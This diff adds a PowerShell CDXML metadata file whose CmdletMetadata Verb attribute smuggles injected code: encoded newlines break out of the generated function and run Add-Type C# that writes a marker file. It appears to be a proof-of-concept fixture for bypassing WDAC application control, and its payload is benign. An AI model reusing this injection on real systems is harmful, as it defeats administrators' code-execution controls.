@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8"?>
+<PowerShellMetadata xmlns="http://schemas.microsoft.com/cmdlets-over-objects/2009/11">
+<Class ClassName="ROOT\cimv2\Win32_Process">
+<Version>1.0.0.0</Version>
+<DefaultNoun>Dummy</DefaultNoun>
+<StaticCmdlets>
+<Cmdlet>
+<CmdletMetadata Verb="Get&#10;{ }&#10;Add-Type -TypeDefinition 'public class Evil { public static string Boom() { return &quot;CSHARP_EXECUTED_IN_WDAC&quot;; } }'; [Evil]::Boom() | Out-File Q:\yard\tmp\delme\wdac_nuclear.txt&#10;function _x" Noun="Dummy" />
+<Method MethodName="Create">
+<ReturnValue>
+<Type PSType="System.UInt32" />
+<CmdletOutputMetadata />
+</ReturnValue>
+</Method>
+</Cmdlet>
+</StaticCmdlets>
+</Class>
+</PowerShellMetadata>
